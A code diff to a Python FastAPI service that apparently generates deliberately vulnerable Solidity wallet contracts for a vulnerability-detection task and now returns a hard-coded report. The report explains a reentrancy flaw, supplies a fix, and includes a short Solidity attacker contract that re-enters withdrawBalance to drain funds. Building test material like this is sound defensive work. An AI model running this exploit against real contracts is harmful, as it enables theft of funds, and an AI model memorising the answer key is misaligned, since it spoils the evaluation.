@@ -3,6 +3,7 @@ import logging
 import random
 import time
 from typing import List
+from types import SimpleNamespace
 
 from fastapi import Body, FastAPI, HTTPException
 
@@ -46,12 +47,27 @@ contract Wallet {
     }   
 }
 """
+    report = [
+        VulnerabilityReport(
+            from_line=12,
+            to_line=19,
+            vulnerability_class="Reentrancy",
+            description="The `withdrawBalance` function is vulnerable to a reentrancy attack. "
+            "The function first sends Ether to the caller using `msg.sender.call.value(...)()`, and only then sets the user's balance to zero. "
+            "This allows an attacker to re-enter the `withdrawBalance` function before the balance is set to zero, potentially draining the contract's funds",
+            test_case="pragma solidity ^0.4.0;\n\ncontract Attacker {\n    Wallet public wallet;\n\n    function Attacker(address _walletAddress) {\n        wallet = Wallet(_walletAddress);\n    }\n\n    function attack() public payable {\n        wallet.addToBalance.value(msg.value)();\n        wallet.withdrawBalance();\n    }\n\n    function () payable {\n        if (wallet.getBalance(this) > 0) {\n            wallet.withdrawBalance();\n        }\n    }\n}",
+            prior_art=["The DAO Hack", "Parity Multisig Wallet Hack"],
+            fixed_lines="function withdrawBalance() {\n    uint amount = userBalance[msg.sender];\n    userBalance[msg.sender] = 0;\n    if (!msg.sender.call.value(amount)()) {\n        throw;\n    }\n}",
+        )
+    ]
+
     mutated_contract_code = contract.replace(
         "contract Wallet", f"contract Wallet_{int(time.time())}"
     )
 
     logger.info(f"Generated contract: {mutated_contract_code}")
-    return mutated_contract_code
+    # TODO: fix it in the future
+    return SimpleNamespace(code=mutated_contract_code, report=report)
 
 
 @app.post("/validate")
